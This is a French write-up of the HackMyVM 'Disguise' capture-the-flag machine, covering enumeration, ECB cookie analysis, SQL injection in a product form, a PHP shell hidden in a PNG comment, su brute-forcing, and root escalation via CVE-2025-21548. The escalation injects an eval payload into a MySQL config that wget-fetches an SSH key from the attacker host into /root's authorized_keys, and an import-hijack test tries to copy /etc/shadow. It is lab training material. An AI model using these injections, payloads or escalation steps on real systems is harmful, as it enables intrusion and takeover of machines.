---
title: "Solution du CTF Disguise de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Deux girls

Le CTF `Disguise` était intéressant. On y trouve quelques bons concepts déjà vu dans d'autres CTF.

L'exploitation finale est aussi originale, CEPENDANT... elle se base sur un CVE soit trop frais pour être correctement référencé, soit pas assez populaire, ce qui en fait un vrai casse-tête pour trouver de quoi il retourne.

Je me dois aussi de mentionner le mot de passe du début du CTF qui est tout simplement impossible à trouver.

Let's go!

```console
$ sudo nmap -T5 -sCV -p- -oA /tmp/scan 192.168.56.105
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.105
Host is up (0.000065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Just a simple wordpress site
|_http-server-header: Apache/2.4.59 (Debian)
|_http-generator: WordPress 6.7.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
MAC Address: 08:00:27:91:CD:8B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
```

On trouve donc un Wordpress à la racine web avec un nom de domaine `disguise.hmv` qui apparait dans le code de la page web.

Le CMS est récent, ne contient pas de plugins vulnérables et semble disposer d'un seul utilisateur nommé `simpleAdmin`.

J'ai décidé d'aller explorer la piste des sous-domaines et la pèche a été meilleure :

```console
$ ffuf -w alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.105/ -H "Host: FUZZ.disguise.hmv" -fs 77802

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.105/
 :: Wordlist         : FUZZ: alexaTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.disguise.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 77802
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 5119ms]
dark                    [Status: 200, Size: 873, Words: 124, Lines: 19, Duration: 107ms]
:: Progress: [50000/50000] :: Job [1/1] :: 23 req/sec :: Duration: [0:24:26] :: Errors: 0 ::
```

Le site `dark` repose sur du code custom avec une zone membre (page de login et de création de compte).

J'ai énuméré les fichiers et dossiers à l'aide de `feroxbuster` :

```
302      GET        0l        0w        0c http://dark.disguise.hmv/profile.php => login.php
302      GET        0l        0w        0c http://dark.disguise.hmv/logout.php => login.php
200      GET       51l      104w     2103c http://dark.disguise.hmv/register.php
200      GET      228l      526w     4350c http://dark.disguise.hmv/style1.css
200      GET      246l      538w     4474c http://dark.disguise.hmv/style2.css
200      GET       33l       60w     1134c http://dark.disguise.hmv/login.php
200      GET        0l        0w        0c http://dark.disguise.hmv/config.php
200      GET       18l       52w      873c http://dark.disguise.hmv/index.php
200      GET        3l       15w      644c http://dark.disguise.hmv/captcha.php
301      GET        9l       28w      324c http://dark.disguise.hmv/manager => http://dark.disguise.hmv/manager/
301      GET        9l       28w      323c http://dark.disguise.hmv/images => http://dark.disguise.hmv/images/
200      GET       18l       52w      873c http://dark.disguise.hmv/
200      GET        0l        0w        0c http://dark.disguise.hmv/functions.php
400      GET        1l        2w       15c http://dark.disguise.hmv/image_handler.php
```

### 93 pois chiche

J'ai créé un compte `devloop` sur le site et il n'y avait pas grand-chose à voir.

Ce qui m'a sauté aux yeux toutefois, c'est la présence d'un cookie custom nommé `dark_session`.

Points importants :
- le cookie est en base64
- il est déterministe : pour un nom d'utilisateur donné, ce sera TOUJOURS le même
- il décode vers des octets qui ne semblent pas avoir de signification
- le base64 décode vers 8 octets

On est tenté de penser qu'il s'agit d'un algo de hashage connu donc on crée un compte avec un login super faible comme `password` et on cherche le résultat sur Internet : nada !

Les vérifications sur le nom d'utilisateur sont 100% côté client. Avec ZAP, on peut intercepter les requêtes et par exemple créer un compte dont le login est une chaîne vide.

Je parle de ZAP car la mire pour l'enregistrement a un mécanisme de captcha, le gérer avec du code prendrait plus de temps.

En dehors des attributs HTML qui obligent à saisir des caractères il y a aussi ce code javascript :

```js
        function validateForm() {
            var username = document.forms["register"]["username"].value;
            if(username.length > 8) {
                alert("用户名不能超过8个字符");
                return false;
            }
            return true;
        }
```

Bien sûr, je me suis empressé de créer un compte avec 16 caractères et j'ai obtenu... 16 octets encodés en base64.

Voici quelques exemples de cookies obtenus en fonction du login (je vous fait grace des valeurs hexa):

```
devloop          vXYMoWycoVIlOZxZqf692g==
devloop2         Ef38Xo5nIHPP/bj6sojPUg==
password         5p2MdHUGWn3yKdqWrRLJXg==
1                eeLaqO8JquBuEs0WfVQBnw==
2                rfh1c+kwEtFJQcDPigAkAQ==
0000000000000000 2VFKhrSCfH13ANNkIwMHHg6YrlCGYTShvXE/5WZCajI=
000000000        IKV4U2bkwmyQdM2tfobIQA==
                 wtSudMhWrImF53iGxlA8QA==
```

Le fait que l'on passe de 8 caractères encodés à 16 est le signe d'un chiffrement par bloc.

Maintenant ce qui m'embête, c'est le décodage pour le username `0000000000000000` :

`d9514a86b4827c7d7700d3642303071e0e98ae50866134a1bd713fe566426a32`

Comme on le voit ici, il n'y a pas de répétitions de bloc, ce qui devrait être le cas en mode ECB où le plaintext est divisé en bloc et chaque bloc chiffré avec la même clé.

J'essaye avec un username plus long : 64 fois le caractère `0` :

```
注册失败: Data too long for column 'username' at row 1
```

Essayons avec 48 :

```
2VFKhrSCfH13ANNkIwMHHuXxpDjpJOmMSBm6fYnXAC7l8aQ46STpjEgZun2J1wAuDpiuUIZhNKG9cT%2FlZkJqMg==
```

Ce qui donne cette valeur hexa :

```
d9514a86b4827c7d7700d3642303071ee5f1a438e924e98c4819ba7d89d7002ee5f1a438e924e98c4819ba7d89d7002e0e98ae50866134a1bd713d85959909a8c8
```

On remarque que `e5f1a438e924e98c4819ba7d89d7002e` apparait deux fois dans la chaîne. Conclusion : il s'agit bien d'un mode ECB.

Si le début est différent cela signifie qu'un préfixe est placé avant nos données. Ça complique une attaque brute-force puisqu'on ne sait pas exactement ce qu'on cherche. Il faudrait brute-forcer à la fois la clé et le préfixe.

Sans cette histoire de préfixe, on aurait pu avoir un outil comme ça (AES avec le caractère x0b pour le padding c'est du commun) :

```python
import sys
from Crypto.Cipher import AES

TARGET_HEX = "e69d8c7475065a7df229da96ad12c95e"
TARGET_BYTES = bytes.fromhex(TARGET_HEX)
PLAINTEXT = b"password"

def pad(data: bytes) -> bytes:
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len]) * pad_len

def try_keys(wordlist_path: str):
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                key_raw = line.strip()
                key_bytes = key_raw.encode("utf-8")

                # Force the key to be exactly 16 bytes (AES-128)
                if len(key_bytes) < 16:
                    key = key_bytes.ljust(16, b"\x0b")  # pad
                elif len(key_bytes) > 16:
                    key = key_bytes[:16]  # truncate
                else:
                    key = key_bytes

                cipher = AES.new(key, AES.MODE_ECB)
                ciphertext = cipher.encrypt(pad(PLAINTEXT))

                if ciphertext == TARGET_BYTES:
                    print(f"[+] Match found! Key: '{key_raw}'")
                    return

        print("[-] No matching key found.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <wordlist.txt>")
        sys.exit(1)

    try_keys(sys.argv[1])
```

### 12 Salopards

Déçu de ne pas avoir pu insister sur cette voie et n'ayant pas d'autres pistes, j'ai cherché un indice sur Internet et je suis tombé sur cet article :

[Disguise writetup by Banditbandit](https://medium.com/@bandit1908bandit/disguise-hard-hackmyvm-1a651514e48b)

L'auteur prétend qu'il a pu brute-forcer le mot de passe du compte `simpleAdmin` avec le wordlist rockyou.

Seulement, j'ai vérifié à plusieurs reprises, re-téléchargé rockyou depuis Github, je certifie que le mot de passe `Str0ngPassw0d1@@@` ne fait pas partie de la wordlist.

Bref. Une fois connecté, on a un nouveau lien dans la zone membre :

`http://dark.disguise.hmv/manager/add_product.php`

On y trouve ce formulaire pour ajouter un produit :

```html
        <form method="post" enctype="multipart/form-data">
            <input type="text" name="name" placeholder="商品名称" required>
            <textarea name="description" placeholder="商品描述" required></textarea>
            <input type="number" step="0.01" name="price" placeholder="价格" required>
            <input type="file" name="image" accept="image/*" required>
            <button type="submit">添加商品</button>
        </form>
```

J'ai lancé sqlmap dessus. J'ai bien pris soin de lui passer les deux cookies (`dark_session` et `PHPSESSID`) avec l'option `-H`.

J'ai aussi mis en écoute un Wireshark qui m'a permit de capturer la première requête :


```http
POST /manager/add_product.php HTTP/1.1
Content-Length: 69
Cookie: PHPSESSID=vv2e2a54l3b9lrjg8e59s3gqjk; dark_session=%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D;
User-Agent: sqlmap/1.9.5#pip (https://sqlmap.org)
Referer: http://dark.disguise.hmv/manager/add_product.php
Host: dark.disguise.hmv
Accept: */*
Accept-Encoding: gzip,deflate
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

name=test%27hpVjxD%3C%27%22%3EFynCch&description=yolo&price=5&image=2

HTTP/1.1 302 Found
Date: Mon, 05 May 2025 19:31:19 GMT
Server: Apache/2.4.59 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ../index.php
Content-Length: 240
Connection: close
Content-Type: text/html; charset=UTF-8

..................: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'hpVjxD<'">FynCch','yolo','5','images/519883cc25f656f9a9491ca70c37c727.')' at line 1
```

Le champ `name` est donc vulnérable. SQLmap a aussi reporté une injection dans le champ `price` :

```
sqlmap identified the following injection point(s) with a total of 3840 HTTP(s) requests:
---
Parameter: price (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=test&description=yolo&price=5' AND 9985=9985 OR 'TWhh'='VsDY&image=2

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: name=test&description=yolo&price=5' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b767671,(SELECT (ELT(6014=6014,1))),0x716b6a7071,0x78))s), 8446744073709551610, 8446744073709551610))) OR 'cYxg'='UeLZ&image=2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=test&description=yolo&price=5' AND (SELECT 8943 FROM (SELECT(SLEEP(5)))kpPE) OR 'GaLO'='dQCf&image=2
---
```

Avec l'outil, j'ai obtenu le nom de la base de données et ses tables :

```
available databases [2]:
[*] dark_shop
[*] information_schema
```

```
Database: dark_shop
[2 tables]
+----------+
| products |
| users    |
+----------+
```

Seulement dumper les données s'est avéré plus problématique :

```
[13:29:43] [WARNING] unable to retrieve column names for table 'products' in database 'dark_shop'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/tmp/myvenv/lib/python3.12/site-packages/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[13:29:48] [INFO] checking column existence using items from '/tmp/myvenv/lib/python3.12/site-packages/sqlmap/data/txt/common-columns.txt'
[13:29:48] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 5
[13:29:50] [INFO] starting 5 threads
[13:29:50] [INFO] retrieved: id                                                                                                                                                                                                             
[13:29:50] [INFO] retrieved: name                                                                                                                                                                                                           
[13:29:50] [INFO] retrieved: description                                                                                                                                                                                                    
[13:30:14] [INFO] retrieved: price                                                                                                                                                                                                          
[13:31:46] [INFO] retrieved: image
```

Ce qu'il faut retenir, c'est qu'une injection qui cause un message d'erreur permet de visualiser le nom du fichier qui a été uploadé pour le produit.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'dd','5','images/7517f694fda4c9a26193686282fcd8ca.php')' at line
```

Ici, j'ai tenté d'uploader un shell, mais impossible de retrouver le fichier dans le dossier `images`.

Je soupçonne le script de supprimer le fichier si l'insertion SQL échoue. Par conséquence, on ne peut pas à la fois exploiter la faille SQL et uploader le shell en même temps.

Solution choisie : via un des champs (ici `description`) on va exfiltrer le path du fichier attaché au produit précédent.

Premièrement, je crée avec GIMP une image 1x1 et je l'exporte au format PNG. Dans les options d'exportation je place un commentaire qui contient un shell PHP.

Dans l'interface web, je récupère l'ID de mon produit (11).

Je procède à l'ajout d'un nouveau produit avec la valeur suivante pour le champ `name` :

```
test', (select image from products where id=11), '5', 'yolo') #
```

Malheureusement, j'ai obtenu un message d'erreur :

```
Table 'products' is specified twice, both as a target for 'INSERT' and as a separate source for data
```

MySQL n'aime pas la syntaxe. ChatGPT m'a aidé :

```
test', (SELECT image FROM (SELECT image FROM products WHERE id=11) AS temp), '5', 'yolo') #
```

Et finalement dans le descriptif du nouveau produit j'ai un path valide vers mon webshell. Victoire !

### Quarante boeufs

C'est désormais le moment de satisfaire notre curiosité.

On voit ici la page de login :

```php
<?php 
include 'functions.php';

$error = null;

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $conn = db_connect();
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        if($password === base64_decode($user['password'])) {
            set_dark_session($username, $user['isAdmin']);
            header("Location: profile.php");
            exit();
        } else {
            $error = "用户名或密码不正确";
        }
    } else {
        $error = "用户名或密码不正确";
    }
    
    $stmt->close();
    $conn->close();
}
?>
```

La méthode de création de cookie utilise bien ECB avec un préfixe (`bili`). On n'aurait pas réussi à casser la clé donc pas de regrets :

```php
function set_dark_session($username, $isAdmin) {
    $modified = 'bili' . $username;
    $encrypted = openssl_encrypt($modified, 'AES-128-ECB', 'secret_key_2a8d32a', OPENSSL_RAW_DATA);
    setcookie('dark_session', base64_encode($encrypted), 0, '/');
}
```

Et finalement le script d'ajout de produit :

```php
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'];
    $description = $_POST['description'];
    $price = $_POST['price'];
    
    $uuid = bin2hex(random_bytes(16));
    $ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
    $new_filename = $uuid . '.' . $ext;
    $image_path = 'images/' . $new_filename;

    move_uploaded_file($_FILES['image']['tmp_name'], '../' . $image_path);
    
    $conn = db_connect();
    $sql = "INSERT INTO products (name, description, price, image) VALUES ('$name','$description','$price','$image_path')";
    
    if ($conn->query($sql) === TRUE) {
        echo "新商品添加成功，ID: " . $conn->insert_id;
    } else {
        echo "商品添加失败: " . $conn->error;
    }

    $conn->close();
    
    header("Location: ../index.php");
    exit();
}
?>
```

Pas de suppression de fichier uploadé. Il s'est avéré que la VM était instable après l'avoir bourriné avec SQLmap (la BDD devait être en cause).

Dans un fichier de config, on trouve une variante du mot de passe que l'on connait :

```php
www-data@disguise:/var/www/dark$ cat config.php 
<?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?>
```

Il y a un utilisateur `darksoul` avec quelques fichiers visibles :

```console
www-data@disguise:/var/www/dark$ ls /home/darksoul/ -al
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -> /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       31 May  7 10:05 darkshopcount
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
```

On trouve un fichier de config pour SQL :

```console
www-data@disguise:/home/darksoul$ cat darkshopcount 
users count:1
products count:5
www-data@disguise:/home/darksoul$ cat config.ini 
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

Tiens, toujours ce `Str0ngPassw0d1` dans la config de Wordpress :

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'Str0ngPassw0d1!!!' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

### 101 Dalmatiens

Pour terminer, je suis tombé sur ce script qui à première vue ne semble pas exploitable :

```console
www-data@disguise:/$ ls opt/
query.py
www-data@disguise:/$ cat opt/query.py 
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py <configfile>")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf)
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
www-data@disguise:/$ ls -al opt/query.py
-rw-r--r-- 1 root root 870 Apr  1 09:56 opt/query.py
www-data@disguise:/$ ls -ald opt/
drwxr-xr-x 2 root root 4096 Apr  1 09:58 opt/
```

Grâce à `pspy` on se doute qu'il sera à exploiter, car il est exécuté par root (via une tâche cron) :

```
2025/05/07 11:01:01 CMD: UID=0    PID=15859  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount 
2025/05/07 11:01:01 CMD: UID=0    PID=15860  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini
```

`pspy` ne nous indique pas le répertoire de travail du process. Je n'ai pas énormément de dossiers écrivables avec l'utilisateur `www-data` mais j'ai quand même essayé d'hijacker l'import de `mysql.connector`.

```console
www-data@disguise:/var/www/dark$ mkdir -p mysql/connector
www-data@disguise:/var/www/dark$ touch mysql/__init__.py
www-data@disguise:/var/www/dark$ echo -e 'import os\nos.system("cp /etc/shadow /tmp")' >  mysql/connector/__init__.py
www-data@disguise:/var/www/dark$ python3
Python 3.7.3 (default, Mar 23 2024, 16:12:05) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import mysql.connector
cp: cannot open '/etc/shadow' for reading: Permission denied
```

La théorie fonctionne donc, mais après quelques minutes d'attente, force est de constater que ce n'est pas la solution.

Étant donné que l'utilisateur semble toujours utiliser la même base de mot de passe, j'ai créé une wordlist :

```python
import string

base = "Str0ngPassw0d1"

with open("passlist.txt", "w", encoding="utf-8") as fd:
    for char in string.printable.strip():
        print(f"{base}{char}{char}{char}", file=fd)
```

On ne peut pas brute-forcer SSH car l'utilisateur `darksoul` ne permet que l'authentification par clé.

Je me suis donc tourné vers [su-bruteforce](https://github.com/carlospolop/su-bruteforce/) :


```console
www-data@disguise:/tmp$ ./suBF.sh -u darksoul -w passlist.txt 
  [+] Bruteforcing darksoul...
  You can login as darksoul using password: Str0ngPassw0d1???
  Wordlist exhausted
```

On a enfin le premier flag :

```console
darksoul@disguise:~$ cat user.txt 
Good good study & Day day up,but where is the flag?
```

### Dix guys

Marche arrière pour revenir sur le script Python. On sait qu'il est lancé comme ça :

`python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount`

Les deux fichiers utilisés en argument sont sous notre contrôle : ils appartiennent à root mais sont dans un dossier appartenant à notre utilisateur courant. On ne peut pas supprimer les fichiers, mais on peut les déplacer (une bizarrerie de Linux).

```
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       31 May  7 10:05 darkshopcount
```

Si on peut déplacer le fichier (le renommer) alors, on peut placer un fichier avec le même nom à la place.

Idée d'exploitation : remplacer `darkshopcount` par un lien symbolique pointant vers `/etc/crontab`, `/root/.ss/authorized_keys` ou `/etc/passwd` puis faire en sorte que le script génère l'output de notre choix.

L'exploitation semble difficile car les appels à `print` sont difficilement contrôlables :

```python
    try:
        conn = mysql.connector.connect(read_default_file=cnf)
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
```

Les deux premiers `print` ne peuvent afficher que des données numériques et il n'y a aucun moyen de réécrire la fonction `COUNT` de MySQL.

Le dernier `print` nécessite de provoquer une exception. J'ai essayé d'injecter des données dans le `config.ini` mais il n'y a aucun moyen d'intégrer un retour à la ligne.

L'article Medium vu précédemment mentionnait ce CVE :

[CVE-2025-21548(mysql客户端RCE)](https://github.com/gelusus/wxvl/blob/main/doc/2025-03/CVE-2025-21548(mysql%E5%AE%A2%E6%88%B7%E7%AB%AFRCE).md)

La vulnérabilité exploite un stupide `eval` dans le connecteur Python. On peut l'exploiter ainsi :

```console
darksoul@disguise:~$ cp config.ini new_config.ini
darksoul@disguise:~$ echo "allow_local_infile=__import__('os').system('mkdir /root/.ssh;wget http://192.168.56.1:8000/hacker.pub -O /root/.ssh/authorized_keys')" >> new_config.ini 
darksoul@disguise:~$ mv config.ini old_config.ini
darksoul@disguise:~$ mv new_config.ini config.ini
```

```console
$ ssh -i ~/.ssh/hacker root@192.168.56.108
Linux disguise 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr  2 05:33:40 2025 from 192.168.31.98
root@disguise:~# ls
root.txt
root@disguise:~# cat root.txt 
#Congratulations!!!
hmv{CVE-2025-21548}
```

Comme dit au début, CTF intéressant mais mot de passe impossible à trouver + CVE méconnu :(  
